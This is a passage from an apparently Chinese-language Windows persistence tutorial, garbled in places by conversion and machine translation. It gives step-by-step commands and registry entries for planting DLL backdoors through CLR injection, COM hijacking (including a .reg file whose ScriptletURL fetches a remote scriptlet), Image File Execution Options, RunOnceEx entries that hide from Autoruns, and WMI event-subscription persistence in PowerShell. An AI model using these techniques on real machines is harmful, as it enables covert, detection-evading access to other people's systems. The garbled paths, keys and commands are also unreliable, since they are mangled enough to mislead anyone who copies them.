> \\ {11111111-1111-1111-1111-111111111111} \\ InProcServe \*
>
> REG.EXE ADD％KEY％/ VE / T REG_SZ / D"％CD％\\ msg.dll"/ F REG.EXE
> ADD％KEY％/ V ThreadingModel / T REG_SZ / D Apartment / F.
POC：https://github.com/3gstudent/CLR-Injection
运行批处理的poc 后，注销或者重启服务器，但是会在运行的目录留下两个dll
文件。
![](media/image183.jpeg){width="5.822305336832896in" height="4.4in"}
####### CAccPropServicesClass＆MMDeviceEnumerato
通过CLR 劫持所有.Net 程序的方法，无需管理员权限，可用作后门。但是通过WMI
添加环境变量需要重启系统.CAccPropServicesClass 和MMDeviceEnumerato
后门原理与之类似，但是不需要重启系统，同样也不需要管理员权限，同时可以绕过自动运行对启动项的检测。
86 系统
> 1，新建文件
>
> 在％APPDATA％\\微软\\安装\\ {BCDE0395-E52F-467C-8E3D- \* 579291692E}
> \\路径
>
> 下加入后门的DLL 文件;
>
> 命名规则为：API-MS-双赢downlevel- \[4char 随机\] -l1-1-0.\_dl
> 2，修改注册表
>
> 注册表位置：HKEY_CURRENT_USER \\ Software \\ Classes 下\\ CLSID \\
>
> 创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}创建子项InprocServe \*
>
> 默认的键值为 32 位的DLL 的绝对路径：
>
> C：\\用户\\管理\\应用程序数据\\漫游\\微软\\安装\\
> {BCDE0395-E52F-467C-8E3D- \* 57 9291692E} \\
> API-MS-双赢下级-1x86-l1-1-0.\_dl
>
> 创建键值：ThreadingModel \| REG_SZ \| 公寓
>
> 3，当打开即或者其他程序时，就会执行加载的DLL
64 位系统
> 1，新建文件
>
> 在％APPDATA％\\微软\\安装\\ {BCDE0395-E52F-467C-8E3D- \* 579291692E}
> \\路径
>
> 下加入后门的DLL 文件;
>
> 命名规则为：API-MS-双赢downlevel- \[4char 随机\] -l1-1-0.\_dl
> 2，修改注册表 1
>
> 注册表位置：HKEY_CURRENT_USER \\ Software \\ Classes 下\\ CLSID \\
> 创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
>
> 创建子项InprocServe \*
>
> 默认的键值为 64 位的DLL 路径：
>
> C：\\用户\\管理\\应用程序数据\\漫游\\微软\\安装\\
> {BCDE0395-E52F-467C-8E3D- \* 57 9291692E} \\
> API-MS-双赢下级-1x64-l1-1-0.\_dl
>
> 创建键值：ThreadingModel \| REG_SZ \| 公寓3，修改注册表 2
>
> 注册表位置：HKEY_CURRENT_USER \\ Software \\ Classes 下\\ Wow6432Node
> \\ CL SID \\
>
> 创建项{BCDE0395-E52F-467C-8E3D- \* 579291692E}
>
> 创建子项InprocServe \*
>
> 默认的键值为 32 位的dll 路径：
>
> C：\\用户\\管理\\应用程序数据\\漫游\\微软\\
> {安装BCDE0395-E52F-467C-8E3D- \* 57 9291692E} \\
> API-MS-双赢下级-1x86-l1-1-0.\_dl
>
> 创建键值：ThreadingModel \| REG_SZ \| 公寓
>
> 如图 4 所示，当打开即或者其他程序时，就会执行加载的DLL
POC：[https](https://github.com/3gstudent/COM-Object-hijacking)：[//github.com/3gstudent/COM-Object-hijacking](https://github.com/3gstudent/COM-Object-hijacking)
####### MruPidlList
不同于上面两种COM 劫持后门，前两种是被动触发的后门，MruPidlList
是主动触发的后门
> 注册表位置：HKEY_CURRENT_USER \\ Software \\ Classes 下\\ CLSID \\
> 创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}
>
> 创建子项InprocServe \*
>
> 默认的键值为DLL 的绝对路径：C：\\测试\\ calc.dll
> 创建键值：ThreadingModel \| REG_SZ \| 公寓
因为注册表对应COM 对象MruPidlList，作用于SHELL32.DLL，SHELL32.DLL
用于打开网页和文件，所以当系统启动时必定会执行，于是后门也就会主动启动，
相当于一个主动后门。
直观的理解：系统在启动时默认启动进程explorer.exe 的，explorer.exe
的会调用shell32.dll 中，加载COM 对象MruPidlList
此类型的后门多次被恶意软件使用：comRAT，ZeroAccess rootkit，bbsrat
####### winlogon_regedit
> Microsoft 组件对象模型（COM）是Windows
> 内的一个系统，用于通过操作系统实现软件组件之间的交互。
>
> 1 攻击者可以使用这个系统插入恶意代码，通过劫持COM
> 引用和关系来代替合法的软件来执行持久化。
>
> 劫持COM 对象需要在Windows
> 注册表中进行更改，以将引用替换为可能导致该组件在执行时无法工作
>
> 的合法系统组件。当系统组件通过正常的系统操作执行时，攻击者的代码将被执行。2
> 攻击者很可能劫
>
> 持足够频繁使用的对象来保持一致的持久性水平，但不可能在系统内破坏明显的功能，以避免可能导致
>
> 检测的系统不稳定。
>
> Windows Registry Editor Version 5.00
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam.1.00\]
> @=\"AtomicRedTeam\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam.1.00\\CLSID\]
> @=\"{00000001-0000-0000-0000-0000FEEDACDC}\"
>
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam\]
> @=\"AtomicRedTeam\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam\\CLSID\]
> @=\"{00000001-0000-0000-0000-0000FEEDACDC}\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
> 0-0000FEEDACDC}\]
>
> @=\"AtomicRedTeam\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
>
> 0-0000FEEDACDC}\\InprocServer32\]
> @=\"C:\\\\WINDOWS\\\\system32\\\\scrobj.dll\"
> \"ThreadingModel\"=\"Apartment\"
>
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
> 0-0000FEEDACDC}\\ProgID\]
>
> @=\"AtomicRedTeam.1.00\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
>
> 0-0000FEEDACDC}\\ScriptletURL\]
> @=\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Win
> dows/Payloads/COMHijackScripts/AtomicRedTeam.sct\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
>
> 0-0000FEEDACDC}\\VersionIndependentProgID\] @=\"AtomicRedTeam\"
>
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{06DA0625-9701-43DA-BFD
> 7-FBEEA2180A1E}\]
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{06DA0625-9701-43DA-BFD
> 7-FBEEA2180A1E}\\TreatAs\]
>
> @=\"{00000001-0000-0000-0000-0000FEEDACDC}\"
![](media/image165.jpeg){width="5.281761811023622in"
height="2.5162489063867017in"}
https://twitter.com/subTee/status/962767403464577024
https://attack.mitre.org/wiki/Technique/T1122
https://gist.github.com/anonymous/3929d9df4035abec725bcdc36659fce5
详细请看视频内容
：https://[www.ggsec.cn/winlogon-regedit.html](http://www.ggsec.cn/winlogon-regedit.html)
14. **Image*File*Execution*Options*cmd**
![](media/image166.jpeg){width="5.801456692913386in" height="6.37in"}
恶意代码中，批量的程序， 启动时 启动 svchost.exe
![](media/image167.jpeg){width="5.826403105861767in"
height="6.305833333333333in"}
> 参考资料 ：https://neonprimetime.blogspot.com/2018/01/java-adwind-rat-
> uses-image-
> file.html?utmcampaign=crowdfire&utmcontent=crowdfire&utmmedium=social
> &utmsource=twitter%232362224631-tw%231515608604431
视频内容：
https://[www.ggsec.cn/Image-File-Execution-Options-cmd.html](http://www.ggsec.cn/Image-File-Execution-Options-cmd.html)
####### RunOnceEx
使用RunOnceEx 进行持久化 - 隐藏自Autoruns.exe
1.  发现一种技术来执行DLL 文件，而不会在登录时被autoruns.exe 检测到。
    需要管理员权限，不属于userland。
运行这个漏洞
> reg add
> HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\
> Depend /v 1 /d \"C:\\Users\\demon\\mbox.dll\"
![](media/image164.jpeg){width="5.839421478565179in"
height="0.7991666666666667in"}
2.  mbox.dll 将在下次登录时启动。或者你可以运行这个命令来触发执行：
> runonce /Explorer
链接(link)：https://oddvar.moe/2018/03/21/persistence-using-runonceex-
hidden-from-autoruns-exe/ https://support.microsoft.com/en-
us/help/310593/description-of-the-runonceex-registry-key
内含视频 ：
https://[www.ggsec.cn/RunOnceEx.html](http://www.ggsec.cn/RunOnceEx.html)
####### WMI
WMI（Windows Management Instrumentation）即Windows
管理规范，由一组强大的工具集合组成，用于管理本地或远程的Windows 系统。
> WMI 相关知识参考翻译：
-   WMI 的攻击，防御与取证分析技术之攻击篇
-   WMI 的攻击，防御与取证分析技术之防御篇
-   WMI 的攻击，防御与取证分析技术之取证分析篇
> 原 文
> ：[https](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)：[//www.fireeye.com/content/dam/fireeye-](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)
> www/global/en/current-threats/pdfs/wp-windows-management-
> instrumentation.pdf
滴：三好学生：
-   WMI
    攻击：[http](http://drops.xmd5.com/static/drops/tips-8189.html)：
    [//drops.xmd5.com/static/drops/tips-8189.html](http://drops.xmd5.com/static/drops/tips-8189.html)
-   WMI
    Backdoor：[http](http://drops.xmd5.com/static/drops/tips-8260.html)：
    [//drops.xmd5.com/static/drops/tips-](http://drops.xmd5.com/static/drops/tips-8260.html)
    8260.html
-   WMI
    防御：[http](http://drops.xmd5.com/static/drops/tips-8290.html)：
    [//drops.xmd5.com/static/drops/tips-8290.html](http://drops.xmd5.com/static/drops/tips-8290.html)
-   不在客户端和服务器留下任何文件，实际位于硬盘上的一个复杂的数据库中
> （objects.data）
-   不改动注册表
-   仅使用PowerShell 的实现存储负载
> ＃管理员权限
>
> powershell\> \$ StaticClass = New-Object
> Management.ManagementClass（\'root \\ c imv2\'，\$ null，
>
> \$空）
>
> powershell\> \$ StaticClass.Name =\'Win32_EvilClass\' powershell\> \$
> StaticClass.Put（）
>
> powershell\> \$
> StaticClass.Properties.Add（\'EvilProperty\'，"这是有效载荷"）
> powershell\> \$ StaticClass.Put（）
隐蔽定时启动程序
> ＃管理员权限
>
> #function 能 ： 每 60s 执 行 一 次 notepad.exe powershell\> \$
> filterName =\'BotFilter82\' powershell\> \$ consumerName
> =\'BotConsumer23\'
>
> ＃创建一个 EventFilter，用于设定触发条件，每隔 60s
> 执行一次powershell\> \$ exePath =\'C：\\ Windows \\ System32 \\
> notepad.exe\'
>
> powershell\> \$ Query ="SELECT \* FROM InstanceModificationEvent
> WITHIN 60 W HERE
>
> TargetInstance ISA\'Win32_PerfFormattedData_PerfOS_System\'"
>
> powershell\> \$ WMIEventFilter = Set-WmiInstance -Class EventFilter
> -NameSpac e"root \\ subscription"-Arguments @ {Name = \$ filterName;
> EventNameSpace ="ro ot \\ cimv2"; QueryLanguage ="WQL"; Query = \$
> Query} -ErrorAction Stop
>
> ＃创建一个CommandLineEventConsumer，用于设定执行的操作
>
> powershell\> \$ WMIEventConsumer = Set-WmiInstance -Class
> CommandLineEvent Consumer -Namespace"root \\ subscription"-Arguments @
> {Name = \$ consumerNa me; ExecutablePath = \$ exePath;
> CommandLineTemplate = \$ exePath}
>
> ＃用于绑定filter 和consumer
>